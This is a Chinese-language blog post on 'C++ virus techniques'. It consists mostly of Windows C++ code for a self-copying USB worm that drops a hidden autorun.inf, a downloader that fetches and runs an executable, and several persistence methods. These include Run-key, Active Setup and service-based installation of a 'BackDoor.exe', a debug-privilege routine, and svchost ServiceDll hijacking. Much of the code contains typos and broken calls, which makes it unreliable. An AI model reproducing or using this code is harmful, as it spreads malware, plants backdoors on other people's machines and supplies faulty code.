---
title: C++病毒技术
date: 2023-11-09 17:04:39
tags: C++
mathjax: true
---

# C++病毒技术

## Windows API编程

### U盘病毒

文件、驱动器操作。

```c++
#include <Windows.h>
char szAutoRun[]="[AutoRun] \
\r\nopen=notepad.exe \
\r\nshell\\open=打开(&O) \
\r\nshell\\open\\Command=notepad.exe \
\r\nshell\\explore=资源管理器(&X) \
\r\nshell\\explore\\Command=notepad.exe \
\r\nshellexecute=notepad.exe \
\r\nshell\\Auto\\Command=notepad.exe";
void infect(char *pszFile,UINT uDriveType){
    char szDriveString[MAXBYTE]={0};
    DWORD dwRet=0;
    DWORD iNum=0;
    char szRoot[4]={0};
    UINT uType=0;
    char szTarget[MAX_PATH]={0};
    dwRet=GetLogicalDriveStrings(MAXBYTE,szDriveString);
    while(iNum<dwRet){
        strncpy(szRoot,&szDriveString[iNum],3);
        uType=GetDriveType(szRoot);
        if(uType==uDriveType){
            lstrcpy(szTarget,szRoot);
            lstrcat(szTarget,"notepad.exe");
            CopyFile(pszFile,szTarget,FALSE);
            SetFileAttributes(szTarget,FILE_ATTRIBUTE_HIDDEN);//隐藏属性
            lstrcpy(szTarget,szRoot);
            lstrcat(szTarget,"autorun.inf");
            HANDLE hFile=CreateFile(szTarget,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
            DWORD dwWritten=0;
            WriteFile(hFile,szAutoRun,lstrlen(szAutoRun),&dwWritten,NULL);
            CloseHandle(hFile);
            SetFileAttributes(szTarget,FILE_ATTRIBUTE_HIDDEN);
        };
        iNum+=4;
    };
};
int main(){
    char szFileName[MAX_PATH]={0};//自身位置
    char szRoot[4]={0};//当前所在盘符
    UINT uType=0;//磁盘类型
    GetModuleFileName(NULL,szFileName,MAX_PATH);//当前所在完整路径及文件名
    strncpy(szRoot,szFileName,3);//盘符
    uType=GetDriveType(szRoot);
    switch(uType){
        case DRIVE_FIXED:
            infect(szFileName,DRIVE_REMOVABLE);//如果在硬盘上就检验一遍是否有移动硬盘
            break;
        case DRIVE_REMOVABLE:
            infect(szFileName,DRIVE_FIXED);//如果在移动磁盘上则将自己复制到磁盘上
            break;
    };
    return 0;
};

```

### 启动项管理

注册表管理。

```c++
#define REG_RUN "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
VOID CManageRunDlg::ShowRunList(){//搜索启动项
    m_RunList.DeleteAllitrems();
    DWORD dwType=0;
    DWORD dwBufferSize=MAXBYTE;
    DWORD dwKeySize=MAXBYTE;
    char szValueName[MAXBYTE]={0};
    char szValueKey[MAXBYTE]={0};
    HKEY hKey=NULL;
    LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE,REG_RUN,0,KEY_ALL_ACCESS,&hKey);
    if(lRet!=ERROR_SUCCESS)
        return;
    int i=0;
    CString strTmp;
    while(TRUE){
        lRet=RegEnumValue(hKey,i,szValueName,&dwBufferSize,NULL,&dwType,(unsigned char*)szValueKey,&dwKeySize);
        if(lRet==ERROR_NO_MORE_ITEMS)
            break;
        strTmp.Format("%d",i);//strTmp为编号 szValueName键名 szValuekey键值
        ZeroMemory(szValueKey,MAXBYTE);
        ZeroMemory(szValueName,MAXBYTE);
        dwBufferSize=MAXBYTE;
        dwKeySize=MAXBYTE;
        i++;
    };
    RegCloseKey(hKey);
};
void CManageRunDlg::onBtnAdd(){//添加启动项 输入：szKeyName szKeyValue
    HKEY hKey=NULL;
    LONG lRet=RegOpenKeyEx(HEKY_LOCAL_MACHINE,REG_RUN,0,KEY_ALL_ACCESS,&hKey);
    if(lRet!=ERROR_SUCCESS)
        return;
    RegSetValueEx(hKey,szKeyName,0,REG_SZ,(const unsigned char*)szKeyValue,strlen(szKeyValue)+sizeof(char));
    RegCloseKey(hKey);
};
void CManageRunDlg::OnBtnDel(){//删除启动项 输入：szKeyName
    HKEY hKey=NULL;
    LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE,REG_RUN,0,KEY_ALL_ACCESS,&hKey);
    RegDeleteValue(hKey,szKeyName);
    RegCloseKey(hKey);
};
```

### 服务管理

```c++
VOID CManageServicesDlg::ShowServiceList(DWORD dwServiceType){//搜索服务
    SC_HANDLE hSCM=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(hSCM==NULL){
        AfxMessageBox("OpenSCManager Error!");
        return;
    };
    DWORD ServiceCound=0;
    DWORD dwSize=0;
    LPENUM_SERVICE_STATUS lpInfo;
    lpInfo=(LPENUM_SERVICE_STATUS)(new BYTE[dwSize]);
    bRet=EnumServicesStatus(hSCM,dwServiceType,SERVICE_STATE_ALL,(LPENUM_SERVICE_STATUS)lpInfo,dwSize,&dwSize,&ServiceCount,NULL);
    if(!bRet){
        CloseServiceHandle(hSCM);
        return;
    };
    for(DWORD i=0;i<ServiceCount;i++){
        CString str;//服务名lpInfo[i].lpServiceName 显示名lpinfo[i].lpDisplayName
        switch(lpInfo[i].ServiceStatus.dwCurrentState){
            case SERVICE_PAUSED:
                //暂停
                break;
            case SERVICE_STOPPED:
                //停止
                break;
            case SERVICE_RUNNING:
                //运行
                break;
            default:
                //其他
                break;
        };
        delete lpInfo;
    };
    CloseServiceHandle(hSCM);
};
void CManageServicesDlg::OnBtnStart(){//启动服务 输入：szServiceName
    char szServiceName[MAXBYTE]={0};
    SC_HANDLE hSCM=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(NULL==hSCM){
        AfxMessageBox("OpenSCManager Error");
        return;
    };
    SC_HANDLE hSCService=OpenService(hSCM,szServiceName,SERVICE_ALL_ACCESS);
    BOOL bRet=StartService(hSCService,0,NULL);
    if(bRet==TRUE){
        //启动成功
    }
    else{
        //启动失败
    };
    CloseServiceHandle(hSCService);
    CloseServiceHandle(hSCM);
};
void CManageServicesDlg::OnBtnStop(){//停止服务 输入：szServiceName
    char szServiceName[MAXBYTE]={0};
    SC_HANDLE hSCM=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(NULL==hSCM){
        AfxMessageBox("OpenSCManager Error");
        return;
    };
    SC_HANDLE hSCService=OpenService(hSCM,szServiceName,SERVICE_ALL_ACCESS);
    BOOL bRet=ControlService(hSCService,SERVICE_CONTROL_STOP,&ServiceStatus);
    if(bRet==TRUE){
        //启动成功
    }
    else{
        //启动失败
    };
    CloseServiceHandle(hSCService);
    CloseServiceHandle(hSCM);
};
```

### 下载者

```c++
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib,"urlmon")
int main(){
    char szURL[MAX_PATH]="...\\*.exe";//网络url
    char szVirus[MAX_PATH]="*.exe";//下载文件地址
    URLDownloadToFile(NULL,szURL,szVirus,0,NULL);
    WinExec(szVirus,SW_SHOW);
    return 0;
};
```

### 进程与线程

```c++
//创建进程
#include <windows.h>
#include <stdio.h>
#define EXEC_FILE "C:\\...\\*.exe";
int main(){
    PROCESS_INFORMATION pi={0};
    STARTUPINFO si={0};
    si.cb=sizeof(STARTUPINFO);
    BOOL bRet=CreateProcess(Exec_File,NULL,NULL,NULL,FALSE,NULL,NULL,NULL,&si,&pi);
    if(bRet==FALSE){
        //进程创建失败
        return -1;
    };
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
};

//结束进程
#include <Windows.h>
int main(int argc,char* argv[]){
    HWND hNoteWnd=FindWindow(NULL,"无标题 - 记事本");
    if(hNoteWnd==NULL)
        return -1;
    DWORD dwNotePid=0;
    GetWindowThreadProcessId(hNoteWnd,&dwNotePid);
    if(dwNotePid==0)
        return 0;
    HANDLE hNoteHandle=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwNotePid);
    if(hNoteHandle==NULL)
        return -1;
    BOOL bRet=TerminateProcess(hNoteHandle,0);
    if(bRet==TRUE){
        //进程创建成功
    };
    CloseHandle(hNoteHandle);
    return 0;
};

//枚举进程
VOID CManageProcessDlg::ShowProcess(){
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hSnap==INVALID_HANDLE_VALUE){
        //失败
        return -1;
    };
    PROCESSENTRY32 Pe32={0};
    Pe32.dwSize=sizeof(PROCESSENTRY32);
    BOOL bRet=Process32First(hSnap,&Pe32);
    int i=0;
    CString str;
    while(bRet){
        //进程名Pe32.szExeFile 进程ID Pe32.th32ProcessID
        i++;
        bRet=Process32Next(hSnap,&Pe32);
    }
    CloseHandle(hSnap);
};

//枚举指定进程加载的DLL
VOID CManageProcessDlg::ShowModule(){//输入：nPid
    MODULEENTRY32 Me32={0};
    Me32.dwSize=sizeof(MODULEENTRY32);
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,nPid);
    if(hSnap==INVALID_HANDLE_VALUE){
        //失败
        return;
    };
    BOOL bRet=Module32First(hSnap,&Me32);
    int i=0;
    CString str;
    while(bRet){
        //DLL名Me32.szModule DLL路径Me32.szExePath
        i++;
        bRet=Module32Next(hSnap,&Me32);
    };
    CloseHandle(hSnap);
};

//权限提升
VOID CManageProcessDlg::DebugPrivilege(){
    HANDLE hToken=NULL;
    BOOl bRet=OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);
    if(bRet==TRUE){
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount=1;
        LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
        CloseHandle(hToken);
    };
};

//线程暂停
void CManageProcessDlg::OnBtnStop(){//输入nPid
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SnapTHREAD,nPid);
    if(hSnap==INVALID_HANDLE_VALUE){
        //失败
        return;
    };
    THREADENTRY32 Te32={0};
    Te32.dwSize=sizeof(THREADENTRY32);
    BOOL bRet=Thread32First(hSnap,&Te32);
    while(bRet){
        if(Te32.th32OwnerProcessID==nPid){
            HANDLE hThread=OpenThread(THREAD_ALL_ACCESS,FALSE,Te32.th32ThreadID);
            SuspendThread(hThread);
            CloseHandle(hThread);
        };
        bRet=Thread32Next(hSnap,&Te32);
    };
    CloseHandle(hSnap);
};

//线程恢复
void CManageProcessDlg::OnBtnResume(){//输入nPid
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,nPid);
    if(hSnap==INVALID_HANDLE_VALUE){
        //失败
        return;
    };
    THREADENTRY32 Te32={0};
    Te32.dwSize=sizeof(THREADENTRY32);
    BOOL bRet=Thread32First(hSnap,&Te32);
    while(bRet){
        if(Te32.th32OwnerProcessID==nPid){
            HANDLE hThread=OpenThread(THREAD_ALL_ACCESS,FALSE,Te32.th32ThreadID);
            ResumeThread(hThread);
            CloseHandle(hThread);
        };
        bRet=Thread32Next(hSnap,&Te32);
    };
    CloseHandle(hSnap);
}
```

### 多线程

```c++
#include <windows.h>
#include <stdio.h>
int g_Num_One=0;
CRITICAL_SECTION g_cs;//临界区
DWORD WINAPI ThreadProc(LPVOID lpParam){
    int nTmp=0;
    for(int i=0;i<10;i++){
        EnterCriticalSection(&g_cs);
        nTmp=g_Num_One;
        nTmp++;
        Sleep(1);//不在同一CPU时间段，留给其他线程进行空隙
        g_Num_One=nTmp;
        LeaveCriticalSection(&g_cs);
    };
    return 0;
};
int main(){
    InitializeCriticalSection(&g_cs);
    HANDLE hThread[10]={0};
    int i;
    for(i=0;i<10;i++)
        hThread[i]=CreateThread(NULL,0,ThreadProc,NULL,0,NULL);
    WaitForMultipleObjects(10,hThread,TRUE,INFINITE);//等待十个线程结束 无限时间 hThread数组前10个
    //...
    for(i=0;i<10;i++)
        CloseHandle(hThread[i]);
    DeleteCriticalSection(&g_cs);
    return 0;
};
```

## 自启动技术

### 法一

启动目录。

```c++
GetSystemDirectory(szSysPath,MAX_PATH);
strncpy(szStartDirectory,szSysPath,3);
strcat(szStartDirectory,"Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\test.exe");
GetModuleFileName(NULL,szFileName,MAX_PATH);
CopyFile(szFileName,szStartDirectory,FALSE);
```

### 法二

注册表启动。几个常用位置：

```
Run注册表键
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Boot Execute
HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute
HKLM\System\CurrentControlSet\Control\Session Manager\SetupExecute
HKLM\System\CurrentControlSet\Control\Session Manager\Execute
HKLM\System\CurrentControlSet\Control\Session Manager\S0InitialCommand
Load注册表键
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
```

示例程序：

```c++
GetModuleFileName(NULL,szFileName,MAX_PATH);
HKEY hKey=NULL;
RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
RegSetValueEx(hKey,"test",0,REG_SZ,(const unsigned char*)szFileName,strlen(szFileName)+sizeof(char));
RegCloseKey(hKey);
```

### ActivieX启动

```c++
#include <windows.h>
#define REG_PATH "software\\microsoft\\active setup\\Installed Components\\{E0EDB497-B2F5-4B4F-97EC-2362BC4CC50D}";//一个已存在的GUID
int main(){
    HKEY hKey;
    LONG lRet=RegOpenKeyEx(HKEY_CURRENT_USER,REG_PATH,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,&hKey);
    if(lRet!=ERROR_SUCCESS){
        char szSelfFile[MAX_PATH]={0};
        char szSystemPath[MAX_PATH]={0};
        GetSystemDirecotry(szSystemPath,MAX_PATH);
        strcat(szSystemPath,"\\Backdoor.exe");
        GetModuleFileName(NULL,szSystemPath,FALSE);
        lRet=RegCreateKeyEx(HKEY_LOCAL_MACHINE,REG_PATH,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
        if(lRet!=ERROR_SUCCESS)
            return -1;
        lRet=RegSetValueEx(hKey,"stubpath",0,REG_SZ,(CONST BYTE*)szSystemPath,strlen(szSystemPath));
        if(lRet!=ERROR_SUCCESS){
            REgCloseKey(hKey);
            return -1;
        };
    };
    RegCloseKey(hKey);
    RegDeleteKey(HKEY_CURRENT_USER,REG_PATH);//第一次启动成功后系统在HKCU下建立GUID值，再次启动时不会被启动，所以要删除
    return 0;
};
```

### 服务启动

```c++
#include <Windows.h>
#include <stdio.h>
int main(int argc,char* argv[]){
    char szFileName[MAX_PATH]={0};
    GetModuleFileName(NULL,szFileName,MAX_PATH);
    SC_HANDLE scHandle=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE scHandleOpen=OpenService(scHandle,"door",SERVICE_ALL_ACCESS);
    if(scHandleOpen==NULL){
        char szSelfFile[MAX_PATH]={0};
        char szSystemPath[MAX_PATH]={0};
        GetSystemDirectory(szSystemPath,MAX_PATH);
        strcat(szSystempath,"\\BackDoor.exe");
        GetModuleFileName(NULL,szSelfFile,MAX_PATH);
        CopyFile(szSelfFile,szSystemPath,FALSE);
        SC_HANDLE scNewHandle=CreateService(scHandle,"door","door",SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,szSystemPath,NULL,sULL,NULL,NULL,NULL);
        StartService(scNewhandle,0,NULL);
        CloseServiceHandle(scNewHandle);
        MessageBox(NULL,"service run","door",MB_OK);
    };
    CloseServiceHandle(scHandleOpen);
    CloseServiceHandle(scHandle);
    //以下可以自由发挥，例如：记录时间
    FILE *pFile=fopen("c:\\a.txt","wa");
    SYSTEMTIME st;
    GetSystemTime(&st);
    char szTime[MAXBYTE]={0};
    wsprintf(szTime,"%d:%d:%d",st.wHour,st.wMinute,st.wSecond);
    fputs(szTime,pFile);
    fclose(pFile);
    return 0;
};
```

### 文件关联启动

在注册表HEKY_CLASS_ROOT\txtfile\shell\open\command下记录打开.txt所需的notepad程序，可以进行替换。

### 替换系统服务启动

举例说明：RemoteAccess服务的宿主为svchost.exe。观察注册表HEKY_LOCAL_MACHINE\System\CurrentControlSet\Services\RemoteAccess\Parameters中键ServiceDll的值为%SystemRoot%\Sytsem32\mprdim.dll。HEKY_LOCAL_MACHINE\System\CurrentControlSet\Services\RemoteAccess中键ImagePath给出了scvhost的启动方式：

```bash
%SystemRoot%\system32\scvhost.exe -k netsvcs
```

具体该启动方法可以查看注册表：HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Svchost\中键netsvcs，内容有Remoteaccess。

可以将某服务中ServiceDll替换为恶意DLL路径，即可被svchost启动。
